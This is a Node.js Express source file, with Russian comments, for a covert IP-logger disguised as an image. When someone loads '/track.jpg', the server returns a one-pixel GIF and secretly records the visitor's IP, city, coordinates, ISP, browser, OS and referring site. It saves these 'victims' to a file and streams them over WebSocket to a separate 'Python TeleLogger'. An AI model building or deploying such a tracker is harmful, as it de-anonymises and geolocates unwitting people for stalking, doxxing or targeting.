const express = require('express');
const WebSocket = require('ws');
const http = require('http');
const fs = require('fs');
const axios = require('axios');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

const PIXEL = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');

// Хранилище WebSocket клиентов (Python TeleLogger)
const clients = new Set();

wss.on('connection', (ws) => {
    console.log('[+] Python TeleLogger connected');
    clients.add(ws);
    ws.on('close', () => clients.delete(ws));
});

// Отправка данных всем клиентам
function broadcastVictimData(data) {
    clients.forEach(client => {
        if (client.readyState === WebSocket.OPEN) {
            client.send(JSON.stringify(data));
        }
    });
}

// Геолокация по IP
async function getGeoLocation(ip) {
    if (ip === '127.0.0.1' || ip.startsWith('192.168') || ip.startsWith('10.')) {
        return { country: 'Local', city: 'Local', isp: 'Local Network' };
    }
    try {
        const response = await axios.get(`http://ip-api.com/json/${ip}`, { timeout: 3000 });
        return response.data;
    } catch(e) {
        return { country: 'Unknown', city: 'Unknown', isp: 'Unknown' };
    }
}

// Парсинг User-Agent
function parseUserAgent(ua) {
    if (!ua) return { browser: 'Unknown', os: 'Unknown', device: 'Unknown' };
    return {
        browser: ua.includes('Firefox') ? 'Firefox' : 
                  ua.includes('Chrome') && !ua.includes('Edg') ? 'Chrome' :
                  ua.includes('Safari') && !ua.includes('Chrome') ? 'Safari' :
                  ua.includes('Edg') ? 'Edge' : 'Other',
        os: ua.includes('Windows') ? 'Windows' :
            ua.includes('Mac') ? 'macOS' :
            ua.includes('Android') ? 'Android' :
            ua.includes('iPhone') ? 'iOS' :
            ua.includes('Linux') ? 'Linux' : 'Other',
        device: ua.includes('Mobile') ? 'Mobile' : 'Desktop'
    };
}

// Главный маршрут для трекинга
app.get('/track.jpg', async (req, res) => {
    // Получаем IP
    let ip = req.headers['x-forwarded-for']?.split(',')[0] || 
             req.headers['x-real-ip'] ||
             req.socket.remoteAddress ||
             req.ip;
    ip = ip?.replace('::ffff:', '');
    
    // Получаем реферер
    const referer = req.headers['referer'] || 'direct';
    let website = 'direct';
    if (referer !== 'direct') {
        try {
            const url = new URL(referer);
            website = url.hostname;
        } catch(e) {}
    }
    
    // Парсим User-Agent
    const ua = req.headers['user-agent'] || 'unknown';
    const uaInfo = parseUserAgent(ua);
    
    // Геолокация
    const geo = await getGeoLocation(ip);
    
    // Формируем данные
    const victimData = {
        ip: ip,
        country: geo.country || 'Unknown',
        city: geo.city || 'Unknown',
        region: geo.regionName || 'Unknown',
        isp: geo.isp || 'Unknown',
        lat: geo.lat || 0,
        lon: geo.lon || 0,
        website: website,
        referer: referer,
        userAgent: ua,
        browser: uaInfo.browser,
        os: uaInfo.os,
        device: uaInfo.device,
        timestamp: new Date().toISOString(),
        acceptLanguage: req.headers['accept-language'] || 'Unknown'
    };
    
    // Отправляем в WebSocket (Python клиенту)
    broadcastVictimData(victimData);
    
    // Сохраняем в файл
    fs.appendFileSync('victims.json', JSON.stringify(victimData) + '\n');
    
    console.log(`[+] Victim: ${ip} | ${geo.country} | ${website}`);
    
    // Отправляем пиксель
    res.set('Content-Type', 'image/gif');
    res.send(PIXEL);
});

// Прокси на Vercel JPG (опционально)
app.get('/vercel.jpg', async (req, res) => {
    try {
        const vercelImage = await axios.get('https://mwr-2w7j.vercel.app/track.jpg', {
            responseType: 'arraybuffer'
        });
        res.set('Content-Type', 'image/jpeg');
        res.send(vercelImage.data);
    } catch(e) {
        res.status(500).send('Error');
    }
});

server.listen(3000, '0.0.0.0', () => {
    console.log(`
╔═══════════════════════════════════════╗
║     Express Tracking Server          ║
╚═══════════════════════════════════════╝

[+] Server: http://0.0.0.0:3000
[+] WebSocket: ws://0.0.0.0:3000
[+] Tracking endpoint: http://YOUR_IP:3000/track.jpg

[!] Запустите Python TeleLogger в другом терминале
    `);
});